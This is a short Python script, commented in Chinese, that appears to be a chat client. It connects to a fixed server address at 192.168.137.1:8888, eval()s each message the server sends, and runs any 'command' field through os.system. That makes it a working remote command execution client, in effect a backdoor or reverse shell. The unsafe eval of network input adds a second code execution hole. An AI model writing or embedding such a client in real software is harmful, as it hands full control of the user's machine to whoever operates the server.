# -*- coding: UTF-8 -*-
import os
import socket
import threading
import queue


def handle(**kwargs):
    if 'command' in kwargs.keys():
        os.system(kwargs['command'])
    if 'chat' in kwargs.keys():
        print('聊天返回', kwargs['chat'])


def receive_messages(client_socket):
    print("已与服务器建立连接")
    while True:
        try:
            # 接收服务器消息
            data = client_socket.recv(10240).decode('utf-8')
            if data:
                print(f"收到服务器的消息：{data}")
                handle(**eval(data))
                print(f"已执行")
                client_queue.put(data)
        except Exception as e:
            print(e)
            print("与服务器的连接已断开")
            client_socket.close()
            break


client_queue = queue.Queue()
# 创建套接字
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 连接服务器
client_socket.connect(('192.168.137.1', 8888))
# 创建线程接收消息
receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
receive_thread.start()
# 发送消息给服务器
while True:
    message = input("请输入消息：")
    client_socket.send(message.encode('utf-8'))
    client_queue.get()
